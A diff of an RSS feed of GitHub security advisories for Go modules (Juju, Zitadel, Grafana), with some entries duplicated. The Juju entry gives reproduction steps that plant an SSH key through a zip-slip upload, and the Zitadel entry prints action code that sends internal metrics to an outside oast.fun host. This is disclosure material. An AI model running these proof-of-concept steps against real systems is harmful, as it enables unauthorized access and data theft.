@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2025-07-09T15:00:15.774Z</updated>
+    <updated>2025-07-09T15:29:52.299Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,408 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/juju/juju] Juju zip slip vulnerability via authenticated endpoint]]></title>
+        <id>https://github.com/advisories/GHSA-24ch-w38v-xmh8</id>
+        <link href="https://github.com/advisories/GHSA-24ch-w38v-xmh8"/>
+        <updated>2025-07-09T15:29:04.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Any user with a Juju account on a controller can upload a charm to the /charms endpoint.
+No specific permissions are required - it's just sufficient for the user to exist in the controller user database.
+A charm which exploits the zip slip vulnerability may be used to allow such a user to get access to a machine running a unit using the affected charm.</p>
+<h3 id="details">Details</h3>
+<p>A controller exposes three charm-related HTTP API endpoints, as follows:</p>
+<ul>
+<li>PUT/GET https://:17070/model-/charms/-</li>
+<li>POST/GET https://:17070/model-/charms</li>
+<li>GET https://:17070/charms</li>
+</ul>
+<p>These endpoints require Basic HTTP authentication credentials and will accept any valid user within the context of the controller. A user that has no specific permission or access granted can call all of these APIs.</p>
+<p>To reproduce:</p>
+<pre><code>juju bootstrap
+juju add-user testuser
+juju change-user-password testuser
+</code></pre>
+<p>Download the ZIP file of an arbitrary charm eg <a href="https://github.com/juju/hello-juju-charm">https://github.com/juju/hello-juju-charm</a></p>
+<p>Download and install the following tool: <a href="https://github.com/usdAG/slipit">https://github.com/usdAG/slipit</a></p>
+<p>Run the following command to generate a new SSH key pair: <code>ssh-keygen</code></p>
+<p>Copy the contents of the newly created public key into a file called <code>authorized_keys</code></p>
+<p>Run the following command to inject the malicious path into the ZIP file:</p>
+<pre><code>slipit hello.zip authorized_keys --separator ../../../../../../home/
+ubuntu/.ssh/
+</code></pre>
+<h2 id="send-the-put-request-below-to-a-model-on-the-target-controller-note-the-following---the-model-uuid-and-controller-ip-address-in-the-request-must-be-updated---the-juju-curl-header-needs-to-be-sent-with-a-value-that-starts-with-the-local-string---the-put-body-content-should-have-the-exact-contents-of-the-zip-file---the-basic-authorization-header-should-be-tied-to-the-user-that-was-created-above---the-first-time-that-the-request-is-sent-an-error-will-be-returned-that-states-that-the-sha-hash-in-the-url-is-invalid-when-this-occurs-copy-the-value-in-the-response-and-replace-it-in-the-final-part-of-the-url-ie-pathtw-updated-sha">Send the PUT request below to a model on the target controller. Note the following:
+- the model UUID and controller IP address in the request must be updated
+- the Juju-Curl header needs to be sent with a value that starts with the “local:” string
+- the PUT body content should have the exact contents of the ZIP file
+- the Basic Authorization header should be tied to the user that was created above
+- the first time that the request is sent, an error will be returned that states that the SHA hash in the URL is invalid. When this occurs, copy the value in the response and replace it in the final part of the URL (i.e. <code>pathtw-&lt;updated-sha&gt;</code>)</h2>
+<pre><code>PUT /model-34bb5ef0-5a3e-41d7-873c-2f884adf606d/charms/pathtw-5c9f25c
+HTTP/1.1
+Host: 10.4.154.217:17070
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko
+/20100101 Firefox/135.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+Content-Length: 40021
+Content-Type: application/zip
+Juju-Curl: local:pathtw
+Authorization: Basic dXNlci10ZXN0dXNlcjpwYXNzd29yZA==
+&lt;ZIP BODY Content&gt;
+</code></pre>
+<p>Observe that the response states that the charm has been uploaded.</p>
+<p>Attempt to SSH to the controller by using the private key that was generated above.</p>
+<p>Observe that it is possible to authenticate because the file has been overwritten.</p>
+<h3 id="code">Code</h3>
+<p>The /charms handlers are registered here
+<a href="https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L897">https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L897</a>
+<a href="https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L990">https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L990</a></p>
+<p>And the only auth required is that the incoming request be for an authenticated user</p>
+<p><a href="https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L754">https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L754</a></p>
+<p>but no specific permission checks are done.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>There are no known workarounds.</p>
+<h3 id="references">References</h3>
+<p><a href="https://drive.google.com/file/d/1pHRNiaA8LyMVJYwIyTqelsqJ9FmImDf0/view">F-02</a></p>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/juju/juju/security/advisories/GHSA-24ch-w38v-xmh8">https://github.com/juju/juju/security/advisories/GHSA-24ch-w38v-xmh8</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-53513">https://nvd.nist.gov/vuln/detail/CVE-2025-53513</a></li>
+<li><a href="https://github.com/juju/juju/commit/6356e984b82a4a7b9771ff5e51e297ad62f3b405">https://github.com/juju/juju/commit/6356e984b82a4a7b9771ff5e51e297ad62f3b405</a></li>
+<li><a href="https://github.com/juju/juju/commit/ff39557a137c0e95d4cd3553b0f19c859c6f5d8e">https://github.com/juju/juju/commit/ff39557a137c0e95d4cd3553b0f19c859c6f5d8e</a></li>
+<li><a href="https://drive.google.com/file/d/1pHRNiaA8LyMVJYwIyTqelsqJ9FmImDf0/view">https://drive.google.com/file/d/1pHRNiaA8LyMVJYwIyTqelsqJ9FmImDf0/view</a></li>
+<li><a href="https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L754">https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L754</a></li>
+<li><a href="https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L897">https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L897</a></li>
+<li><a href="https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L990">https://github.com/juju/juju/blob/3.6/apiserver/apiserver.go#L990</a></li>
+<li><a href="https://github.com/advisories/GHSA-24ch-w38v-xmh8">https://github.com/advisories/GHSA-24ch-w38v-xmh8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-24ch-w38v-xmh8</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2025-07-09T15:29:03.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/zitadel/zitadel] Denied Host Validation Bypass in Zitadel Actions]]></title>
+        <id>https://github.com/advisories/GHSA-6cf5-w9h3-4rqv</id>
+        <link href="https://github.com/advisories/GHSA-6cf5-w9h3-4rqv"/>
+        <updated>2025-07-09T15:24:53.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A flaw in the URL validation mechanism of Zitadel actions allows bypassing restrictions intended to block requests to localhost (127.0.0.1).  The isHostBlocked check, designed to prevent such requests, can be circumvented by creating a DNS record that resolves to 127.0.0.1. This enables actions to send requests to localhost despite the intended security measures.</p>
+<h3 id="details">Details</h3>
+<p>While attempting to send a request directly to 127.0.0.1 via an action results in an error (see image below), the restriction can be bypassed using a custom DNS record.
+<img src="https://github.com/user-attachments/assets/6d22dae8-407f-4420-a937-aca53d22d05d" alt="image" width="781"></p>
+<p>The relevant action code demonstrates the attempted request to 127.0.0.1:</p>
+<pre><code>let http = require('zitadel/http')
+let logger = require("zitadel/log")
+function make_api_call(ctx, api) {
+    var user = http.fetch('http://127.0.0.1:8080/debug/metrics');
+
+    var api_r = http.fetch('https://obtjoiwgtaftuhbjugulyolvvxuvuuosq.oast.fun/test', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            'data': user,
+        }),
+    });
+    logger.log(api_r.body);
+}
+</code></pre>
+<p>By creating a DNS record that resolves a custom domain to 127.0.0.1 (illustrated below using messwithdns), the action can successfully send the request.
+<img alt="image" src="https://github.com/user-attachments/assets/d1544a7c-684a-485c-8857-eb846ba946b7"></p>
+<p>The modified action code uses the custom domain instead of 127.0.0.1:</p>
+<pre><code>let http = require('zitadel/http')
+let logger = require("zitadel/log")
+function make_api_call(ctx, api) {
+    var user = http.fetch('http://ok.jelly244.messwithdns.com:8080/debug/metrics');
+
+    var api_r = http.fetch('https://obtjoiwgtaftuhbjugulyolvvxuvuuosq.oast.fun/test', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            'user': user,
+        }),
+    });
+    logger.log(api_r.body);
+}
+</code></pre>
+<p><img alt="image" src="https://github.com/user-attachments/assets/5a1c720b-fdda-4e7a-b0e0-ec29bff6690e"></p>
+<p>This demonstrates that data from the /debug/metrics API, intended to be restricted to localhost, can be fetched and sent to an external endpoint.
+<img alt="image" src="https://github.com/user-attachments/assets/c8e6abe4-5d2c-48d9-ba0f-dacae38ba0be"></p>
+<h2 id="impact">Impact</h2>
+<p>This vulnerability potentially allows unauthorized access to unsecured internal endpoints, which may contain sensitive information or functionalities.</p>
+<h2 id="patches">Patches</h2>
+<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.64.1">2.64.1</a>
+2.63.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.63.6">2.63.6</a>
+2.62.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.62.8">2.62.8</a>
+2.61.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.61.4">2.61.4</a>
+2.60.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.60.4">2.60.4</a>
+2.59.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.59.5">2.59.5</a>
+2.58.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.58.7">2.58.7</a></p>
+<h2 id="workarounds">Workarounds</h2>
+<p>There is no workaround since a patch is already available.</p>
+<h2 id="questions">Questions</h2>
+<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
+<h2 id="credits">Credits</h2>
+<p>Thanks to @prdp1137 for reporting this!</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-6cf5-w9h3-4rqv">https://github.com/zitadel/zitadel/security/advisories/GHSA-6cf5-w9h3-4rqv</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-49753">https://nvd.nist.gov/vuln/detail/CVE-2024-49753</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.58.7">https://github.com/zitadel/zitadel/releases/tag/v2.58.7</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.59.5">https://github.com/zitadel/zitadel/releases/tag/v2.59.5</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.60.4">https://github.com/zitadel/zitadel/releases/tag/v2.60.4</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.61.4">https://github.com/zitadel/zitadel/releases/tag/v2.61.4</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.62.8">https://github.com/zitadel/zitadel/releases/tag/v2.62.8</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.63.6">https://github.com/zitadel/zitadel/releases/tag/v2.63.6</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.64.1">https://github.com/zitadel/zitadel/releases/tag/v2.64.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-6cf5-w9h3-4rqv">https://github.com/advisories/GHSA-6cf5-w9h3-4rqv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6cf5-w9h3-4rqv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-10-25T19:29:20.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/zitadel/zitadel] Denied Host Validation Bypass in Zitadel Actions]]></title>
+        <id>https://github.com/advisories/GHSA-6cf5-w9h3-4rqv</id>
+        <link href="https://github.com/advisories/GHSA-6cf5-w9h3-4rqv"/>
+        <updated>2025-07-09T15:24:53.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A flaw in the URL validation mechanism of Zitadel actions allows bypassing restrictions intended to block requests to localhost (127.0.0.1).  The isHostBlocked check, designed to prevent such requests, can be circumvented by creating a DNS record that resolves to 127.0.0.1. This enables actions to send requests to localhost despite the intended security measures.</p>
+<h3 id="details">Details</h3>
+<p>While attempting to send a request directly to 127.0.0.1 via an action results in an error (see image below), the restriction can be bypassed using a custom DNS record.
+<img src="https://github.com/user-attachments/assets/6d22dae8-407f-4420-a937-aca53d22d05d" alt="image" width="781"></p>
+<p>The relevant action code demonstrates the attempted request to 127.0.0.1:</p>
+<pre><code>let http = require('zitadel/http')
+let logger = require("zitadel/log")
+function make_api_call(ctx, api) {
+    var user = http.fetch('http://127.0.0.1:8080/debug/metrics');
+
+    var api_r = http.fetch('https://obtjoiwgtaftuhbjugulyolvvxuvuuosq.oast.fun/test', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            'data': user,
+        }),
+    });
+    logger.log(api_r.body);
+}
+</code></pre>
+<p>By creating a DNS record that resolves a custom domain to 127.0.0.1 (illustrated below using messwithdns), the action can successfully send the request.
+<img alt="image" src="https://github.com/user-attachments/assets/d1544a7c-684a-485c-8857-eb846ba946b7"></p>
+<p>The modified action code uses the custom domain instead of 127.0.0.1:</p>
+<pre><code>let http = require('zitadel/http')
+let logger = require("zitadel/log")
+function make_api_call(ctx, api) {
+    var user = http.fetch('http://ok.jelly244.messwithdns.com:8080/debug/metrics');
+
+    var api_r = http.fetch('https://obtjoiwgtaftuhbjugulyolvvxuvuuosq.oast.fun/test', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            'user': user,
+        }),
+    });
+    logger.log(api_r.body);
+}
+</code></pre>
+<p><img alt="image" src="https://github.com/user-attachments/assets/5a1c720b-fdda-4e7a-b0e0-ec29bff6690e"></p>
+<p>This demonstrates that data from the /debug/metrics API, intended to be restricted to localhost, can be fetched and sent to an external endpoint.
+<img alt="image" src="https://github.com/user-attachments/assets/c8e6abe4-5d2c-48d9-ba0f-dacae38ba0be"></p>
+<h2 id="impact">Impact</h2>
+<p>This vulnerability potentially allows unauthorized access to unsecured internal endpoints, which may contain sensitive information or functionalities.</p>
+<h2 id="patches">Patches</h2>
+<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.64.1">2.64.1</a>
+2.63.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.63.6">2.63.6</a>
+2.62.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.62.8">2.62.8</a>
+2.61.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.61.4">2.61.4</a>
+2.60.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.60.4">2.60.4</a>
+2.59.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.59.5">2.59.5</a>
+2.58.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.58.7">2.58.7</a></p>
+<h2 id="workarounds">Workarounds</h2>
+<p>There is no workaround since a patch is already available.</p>
+<h2 id="questions">Questions</h2>
+<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
+<h2 id="credits">Credits</h2>
+<p>Thanks to @prdp1137 for reporting this!</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-6cf5-w9h3-4rqv">https://github.com/zitadel/zitadel/security/advisories/GHSA-6cf5-w9h3-4rqv</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-49753">https://nvd.nist.gov/vuln/detail/CVE-2024-49753</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.58.7">https://github.com/zitadel/zitadel/releases/tag/v2.58.7</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.59.5">https://github.com/zitadel/zitadel/releases/tag/v2.59.5</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.60.4">https://github.com/zitadel/zitadel/releases/tag/v2.60.4</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.61.4">https://github.com/zitadel/zitadel/releases/tag/v2.61.4</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.62.8">https://github.com/zitadel/zitadel/releases/tag/v2.62.8</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.63.6">https://github.com/zitadel/zitadel/releases/tag/v2.63.6</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.64.1">https://github.com/zitadel/zitadel/releases/tag/v2.64.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-6cf5-w9h3-4rqv">https://github.com/advisories/GHSA-6cf5-w9h3-4rqv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6cf5-w9h3-4rqv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-10-25T19:29:20.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/grafana/grafana] Grafana plugin data sources vulnerable to access control bypass]]></title>
+        <id>https://github.com/advisories/GHSA-hh8p-374f-qgr5</id>
+        <link href="https://github.com/advisories/GHSA-hh8p-374f-qgr5"/>
+        <updated>2025-07-09T15:20:28.000Z</updated>
+        <content type="html"><![CDATA[<p>Access control for plugin data sources protected by the ReqActions json field of the plugin.json is bypassed if the user or service account is granted associated access to any other data source, as the ReqActions check was not scoped to each specific datasource. The account must have prior query access to the impacted datasource.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6322">https://nvd.nist.gov/vuln/detail/CVE-2024-6322</a></li>
+<li><a href="https://grafana.com/security/security-advisories/cve-2024-6322">https://grafana.com/security/security-advisories/cve-2024-6322</a></li>
+<li><a href="https://github.com/grafana/grafana/commit/4cb3ba5d1a7ab8b9676034e89dada2fcde1766ef">https://github.com/grafana/grafana/commit/4cb3ba5d1a7ab8b9676034e89dada2fcde1766ef</a></li>
+<li><a href="https://github.com/grafana/grafana/commit/9cdba084a9100c6b11d32eef9d2bd53656c6964a">https://github.com/grafana/grafana/commit/9cdba084a9100c6b11d32eef9d2bd53656c6964a</a></li>
+<li><a href="https://github.com/advisories/GHSA-hh8p-374f-qgr5">https://github.com/advisories/GHSA-hh8p-374f-qgr5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hh8p-374f-qgr5</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-08-20T18:31:26.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL has improper HTML sanitization in emails and Console UI]]></title>
+        <id>https://github.com/advisories/GHSA-v333-7h2p-5fhv</id>
+        <link href="https://github.com/advisories/GHSA-v333-7h2p-5fhv"/>
+        <updated>2025-07-09T15:00:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>ZITADEL uses HTML for emails and renders certain information such as usernames dynamically. That information can be entered by users or administrators. Due to a missing output sanitization, these emails could include malicious code.
+This may potentially lead to a threat where an attacker, without privileges, could send out altered notifications that are part of the registration processes. An attacker could create a malicious link, where the injected code would be rendered as part of the email.</p>
+<p>During investigation of this issue a related issue was found and mitigated, where on the user's detail page the username was not sanitized and would also render HTML, giving an attacker the same vulnerability.</p>
+<p>While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by most email clients and the Content Security Policy in Console UI.</p>
+<h3 id="patches">Patches</h3>
+<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.58.1">2.58.1</a>
+2.57.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.57.1">2.57.1</a>
+2.56.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.56.2">2.56.2</a>
+2.55.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.55.5">2.55.5</a>
+2.54.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.54.8">2.54.8</a>
+2.53.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.53.9">2.53.9</a>
+2.52.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.52.3">2.52.9</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>There is no workaround since a patch is already available.</p>
+<h3 id="questions">Questions</h3>
+<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
+<h3 id="credits">Credits</h3>
+<p>Thanks to Sushmita Poudel and David Underwood for reporting this.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-v333-7h2p-5fhv">https://github.com/zitadel/zitadel/security/advisories/GHSA-v333-7h2p-5fhv</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41953">https://nvd.nist.gov/vuln/detail/CVE-2024-41953</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/0e1f99e987b5851caec45a72660fe9f67e425747">https://github.com/zitadel/zitadel/commit/0e1f99e987b5851caec45a72660fe9f67e425747</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/38da602ee1cfc35c0d7918c298fbfc3f3674133b">https://github.com/zitadel/zitadel/commit/38da602ee1cfc35c0d7918c298fbfc3f3674133b</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/4b59cac67bb89c1f3f84a2041dd273d11151d29f">https://github.com/zitadel/zitadel/commit/4b59cac67bb89c1f3f84a2041dd273d11151d29f</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/c1a3fc72dde16e987d8a09aa291e7c2edfc928f7">https://github.com/zitadel/zitadel/commit/c1a3fc72dde16e987d8a09aa291e7c2edfc928f7</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/c353f82f89c6982c0888c6763363296cf4263cb2">https://github.com/zitadel/zitadel/commit/c353f82f89c6982c0888c6763363296cf4263cb2</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/d04ac6df8f2f0243e649b802a8bfa6176cef0923">https://github.com/zitadel/zitadel/commit/d04ac6df8f2f0243e649b802a8bfa6176cef0923</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/f846616a3f022e88e3ea8cea05d3254ad86f1615">https://github.com/zitadel/zitadel/commit/f846616a3f022e88e3ea8cea05d3254ad86f1615</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.52.3">https://github.com/zitadel/zitadel/releases/tag/v2.52.3</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.53.9">https://github.com/zitadel/zitadel/releases/tag/v2.53.9</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.54.8">https://github.com/zitadel/zitadel/releases/tag/v2.54.8</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.55.5">https://github.com/zitadel/zitadel/releases/tag/v2.55.5</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.56.2">https://github.com/zitadel/zitadel/releases/tag/v2.56.2</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.57.1">https://github.com/zitadel/zitadel/releases/tag/v2.57.1</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.58.1">https://github.com/zitadel/zitadel/releases/tag/v2.58.1</a></li>
+<li><a href="https://pkg.go.dev/vuln/GO-2024-3015">https://pkg.go.dev/vuln/GO-2024-3015</a></li>
+<li><a href="https://github.com/advisories/GHSA-v333-7h2p-5fhv">https://github.com/advisories/GHSA-v333-7h2p-5fhv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v333-7h2p-5fhv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-07-31T20:59:13.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/zitadel/zitadel] ZITADEL has improper HTML sanitization in emails and Console UI]]></title>
+        <id>https://github.com/advisories/GHSA-v333-7h2p-5fhv</id>
+        <link href="https://github.com/advisories/GHSA-v333-7h2p-5fhv"/>
+        <updated>2025-07-09T15:00:32.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>ZITADEL uses HTML for emails and renders certain information such as usernames dynamically. That information can be entered by users or administrators. Due to a missing output sanitization, these emails could include malicious code.
+This may potentially lead to a threat where an attacker, without privileges, could send out altered notifications that are part of the registration processes. An attacker could create a malicious link, where the injected code would be rendered as part of the email.</p>
+<p>During investigation of this issue a related issue was found and mitigated, where on the user's detail page the username was not sanitized and would also render HTML, giving an attacker the same vulnerability.</p>
+<p>While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by most email clients and the Content Security Policy in Console UI.</p>
+<h3 id="patches">Patches</h3>
+<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.58.1">2.58.1</a>
+2.57.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.57.1">2.57.1</a>
+2.56.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.56.2">2.56.2</a>
+2.55.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.55.5">2.55.5</a>
+2.54.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.54.8">2.54.8</a>
+2.53.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.53.9">2.53.9</a>
+2.52.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.52.3">2.52.9</a></p>
+<h3 id="workarounds">Workarounds</h3>
+<p>There is no workaround since a patch is already available.</p>
+<h3 id="questions">Questions</h3>
+<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
+<h3 id="credits">Credits</h3>
+<p>Thanks to Sushmita Poudel and David Underwood for reporting this.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-v333-7h2p-5fhv">https://github.com/zitadel/zitadel/security/advisories/GHSA-v333-7h2p-5fhv</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41953">https://nvd.nist.gov/vuln/detail/CVE-2024-41953</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/0e1f99e987b5851caec45a72660fe9f67e425747">https://github.com/zitadel/zitadel/commit/0e1f99e987b5851caec45a72660fe9f67e425747</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/38da602ee1cfc35c0d7918c298fbfc3f3674133b">https://github.com/zitadel/zitadel/commit/38da602ee1cfc35c0d7918c298fbfc3f3674133b</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/4b59cac67bb89c1f3f84a2041dd273d11151d29f">https://github.com/zitadel/zitadel/commit/4b59cac67bb89c1f3f84a2041dd273d11151d29f</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/c1a3fc72dde16e987d8a09aa291e7c2edfc928f7">https://github.com/zitadel/zitadel/commit/c1a3fc72dde16e987d8a09aa291e7c2edfc928f7</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/c353f82f89c6982c0888c6763363296cf4263cb2">https://github.com/zitadel/zitadel/commit/c353f82f89c6982c0888c6763363296cf4263cb2</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/d04ac6df8f2f0243e649b802a8bfa6176cef0923">https://github.com/zitadel/zitadel/commit/d04ac6df8f2f0243e649b802a8bfa6176cef0923</a></li>
+<li><a href="https://github.com/zitadel/zitadel/commit/f846616a3f022e88e3ea8cea05d3254ad86f1615">https://github.com/zitadel/zitadel/commit/f846616a3f022e88e3ea8cea05d3254ad86f1615</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.52.3">https://github.com/zitadel/zitadel/releases/tag/v2.52.3</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.53.9">https://github.com/zitadel/zitadel/releases/tag/v2.53.9</a></li>
